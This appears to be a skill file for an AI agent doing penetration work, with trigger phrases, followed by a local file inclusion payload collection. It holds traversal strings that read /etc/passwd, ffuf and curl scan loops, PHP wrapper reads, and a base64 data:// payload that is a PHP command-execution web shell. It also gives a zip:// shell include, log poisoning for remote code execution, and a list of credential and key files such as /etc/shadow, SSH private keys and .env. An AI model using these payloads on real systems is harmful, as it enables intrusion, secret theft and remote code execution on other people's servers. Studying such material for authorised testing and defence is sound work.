---
name: payload-lfi
description: "LFI/path traversal payload collection — directory traversal sequences, null byte, URL encoding, double encoding, PHP wrappers, log poisoning for RCE. Triggers: 'lfi payload', 'local file inclusion payload', 'path traversal payload', 'php wrapper', 'log poisoning'."
---

# LFI / Path Traversal Payload Collection

Organized payload reference for local file inclusion and path traversal exploitation.

## Phase 1: Basic Traversal Sequences

```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
..%2F..%2Fetc%2Fpasswd
..%252F..%252Fetc%252Fpasswd
../../../etc/passwd%00
../../../etc/passwd%00.jpg
/etc/passwd
```

## Phase 2: FFUF Scan

```bash
TARGET="https://TARGET"
PARAM="file"
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -u "${TARGET}?${PARAM}=FUZZ" -fc 404,403 -o /workspace/output/lfi-results.json

for depth in 2 3 4 5 6; do
  prefix=$(python3 -c "print('../'*${depth})")
  curl -s "${TARGET}?${PARAM}=${prefix}etc/passwd" | grep -q "root:" && echo "Depth ${depth} works"
done
```

## Phase 3: PHP Wrappers

```bash
# Base64 encode read
curl "${TARGET}?${PARAM}=php://filter/convert.base64-encode/resource=/etc/passwd" | base64 -d
curl "${TARGET}?${PARAM}=php://filter/convert.base64-encode/resource=index.php" | base64 -d

# data:// wrapper RCE
curl "${TARGET}?${PARAM}=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"

# zip:// chain after file upload
curl "${TARGET}?${PARAM}=zip:///var/www/uploads/shell.jpg%23shell"
```

## Phase 4: Log Poisoning via User-Agent

```bash
# Poison log file
curl -s "${TARGET}/" -H 'User-Agent: PAYLOAD_HERE'

# Include poisoned log
curl "${TARGET}?${PARAM}=../../../var/log/apache2/access.log&cmd=id"
curl "${TARGET}?${PARAM}=../../../proc/self/environ&cmd=id"
```

## Phase 5: High-Value Target Files

```
Linux: /etc/passwd /etc/shadow /etc/hosts /proc/self/cmdline
       /proc/self/environ ~/.ssh/id_rsa ~/.bash_history
       /var/www/html/.env /var/www/html/config.php
Windows: C:\Windows\win.ini C:\inetpub\wwwroot\web.config
```

## Output

Save to `/workspace/output/`:
- `lfi-results.json` — ffuf scan results
- `lfi-files.txt` — successfully read files

## Next Phase

→ `vuln-rce` for shell via log poisoning
→ `post-linux-privesc` after initial access
